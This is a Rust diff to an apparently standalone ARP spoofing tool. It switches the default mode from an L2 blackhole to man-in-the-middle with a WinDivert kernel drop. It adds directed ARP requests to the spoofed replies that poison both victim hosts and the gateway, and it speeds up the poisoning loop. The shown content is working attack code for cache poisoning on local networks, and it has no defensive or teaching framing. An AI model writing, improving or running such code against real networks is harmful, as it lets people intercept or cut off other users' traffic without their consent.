@@ -16,7 +16,7 @@ pub fn reset_target_add_count() {
     SPOOFER_TARGET_ADD_COUNT.store(0, Ordering::SeqCst);
 }
 
-use crate::spoofer::raw_l2::{craft_arp_reply, RawL2Sender};
+use crate::spoofer::raw_l2::{craft_arp_reply, craft_directed_arp_request, RawL2Sender};
 use crate::types::{Host, HostStatus, MacAddress};
 
 /// Locally administered unicast blackhole MAC address.
@@ -26,10 +26,10 @@ pub const BLACKHOLE_MAC: MacAddress = MacAddress([0x02, 0xbf, 0x00, 0x00, 0x00, 
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum SpooferMode {
-    /// L2 blackholing: Victims send traffic to BLACKHOLE_MAC, silently dropped by L2 switch/AP
-    Blackhole,
     /// MITM kernel drop: Victims send traffic to local host MAC, dropped by WinDivert kernel filter
     Mitm,
+    /// L2 blackholing: Victims send traffic to BLACKHOLE_MAC, silently dropped by L2 switch/AP
+    Blackhole,
 }
 
 #[derive(Clone)]
@@ -56,7 +56,7 @@ impl ArpSpoofer {
             gateway_mac,
             targets: Arc::new(RwLock::new(HashMap::new())),
             running: Arc::new(AtomicBool::new(false)),
-            mode: Arc::new(RwLock::new(SpooferMode::Blackhole)),
+            mode: Arc::new(RwLock::new(SpooferMode::Mitm)),
         }
     }
 
@@ -73,7 +73,7 @@ impl ArpSpoofer {
             gateway_mac,
             targets: Arc::new(RwLock::new(HashMap::new())),
             running: Arc::new(AtomicBool::new(false)),
-            mode: Arc::new(RwLock::new(SpooferMode::Blackhole)),
+            mode: Arc::new(RwLock::new(SpooferMode::Mitm)),
         }
     }
 
@@ -98,7 +98,7 @@ impl ArpSpoofer {
             gateway_mac,
             targets: Arc::new(RwLock::new(HashMap::new())),
             running: Arc::new(AtomicBool::new(false)),
-            mode: Arc::new(RwLock::new(SpooferMode::Blackhole)),
+            mode: Arc::new(RwLock::new(SpooferMode::Mitm)),
         }
     }
 
@@ -257,7 +257,7 @@ impl ArpSpoofer {
                         // Poison target host: Gateway IP is at spoof_gw_mac.
                         // Ethernet frame source MAC MUST be local_mac (transmitting station address on medium)
                         // so Wi-Fi APs and 802.11/NDIS firmware deliver the packet rather than dropping it.
-                        let pkt_host = craft_arp_reply(
+                        let pkt_host_reply = craft_arp_reply(
                             host.mac,
                             local_mac,
                             gateway_ip,
@@ -265,11 +265,20 @@ impl ArpSpoofer {
                             host.ip,
                             host.mac,
                         );
-                        let _ = s.send_frame(&pkt_host);
+                        let _ = s.send_frame(&pkt_host_reply);
+
+                        let pkt_host_req = craft_directed_arp_request(
+                            host.mac,
+                            local_mac,
+                            gateway_ip,
+                            spoof_gw_mac,
+                            host.ip,
+                        );
+                        let _ = s.send_frame(&pkt_host_req);
 
                         // Poison gateway: Host IP is at spoof_host_mac.
                         // Ethernet frame source MAC MUST be local_mac.
-                        let pkt_gw = craft_arp_reply(
+                        let pkt_gw_reply = craft_arp_reply(
                             gateway_mac,
                             local_mac,
                             host.ip,
@@ -277,10 +286,19 @@ impl ArpSpoofer {
                             gateway_ip,
                             gateway_mac,
                         );
-                        let _ = s.send_frame(&pkt_gw);
+                        let _ = s.send_frame(&pkt_gw_reply);
+
+                        let pkt_gw_req = craft_directed_arp_request(
+                            gateway_mac,
+                            local_mac,
+                            host.ip,
+                            spoof_host_mac,
+                            gateway_ip,
+                        );
+                        let _ = s.send_frame(&pkt_gw_req);
                     }
                 }
-                for _ in 0..10 {
+                for _ in 0..2 {
                     if !running.load(Ordering::Relaxed) {
                         break;
                     }
